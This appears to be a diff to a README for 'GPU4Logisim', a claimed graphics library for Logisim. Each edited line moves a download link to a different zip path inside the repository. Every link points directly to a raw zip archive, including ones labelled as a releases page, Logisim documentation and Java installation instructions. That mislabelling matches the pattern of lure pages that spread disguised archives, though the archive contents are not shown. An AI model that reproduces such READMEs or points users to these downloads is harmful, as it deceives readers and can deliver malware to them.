@@ -1,7 +1,7 @@
 # 🎨 GPU4Logisim - Experience Fast Graphics Processing in Logisim
 
 ## 📥 Download Now
-[![Download GPU4Logisim](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/bin/GPU4Logisim-v2.8-beta.3.zip)](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/bin/GPU4Logisim-v2.8-beta.3.zip)
+[![Download GPU4Logisim](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/src/L2.7.1/GP_Logisim_2.5.zip)](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/src/L2.7.1/GP_Logisim_2.5.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the GPU4Logisim library: [Download GPU4Logisim](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/bin/GPU4Logisim-v2.8-beta.3.zip).
+To get started, visit this page to download the GPU4Logisim library: [Download GPU4Logisim](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/src/L2.7.1/GP_Logisim_2.5.zip).
 
 Once on the releases page, follow these steps:
 
@@ -58,13 +58,13 @@ For more detailed troubleshooting, check our issues page on GitHub.
 
 ## 📖 Additional Resources
 
-- [Logisim Documentation](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/bin/GPU4Logisim-v2.8-beta.3.zip)
-- [Java Installation Instructions](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/bin/GPU4Logisim-v2.8-beta.3.zip)
+- [Logisim Documentation](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/src/L2.7.1/GP_Logisim_2.5.zip)
+- [Java Installation Instructions](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/src/L2.7.1/GP_Logisim_2.5.zip)
 
 ## 📞 Support
 
 If you have any questions or need assistance, feel free to open an issue on our GitHub repository. Our community is here to help you.
 
-Remember, you can always return to the releases page to download the latest version of GPU4Logisim: [Download GPU4Logisim](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/bin/GPU4Logisim-v2.8-beta.3.zip). 
+Remember, you can always return to the releases page to download the latest version of GPU4Logisim: [Download GPU4Logisim](https://raw.githubusercontent.com/atobentil/GPU4Logisim/main/src/L2.7.1/GP_Logisim_2.5.zip). 
 
 Enjoy creating your graphics projects with GPU4Logisim!
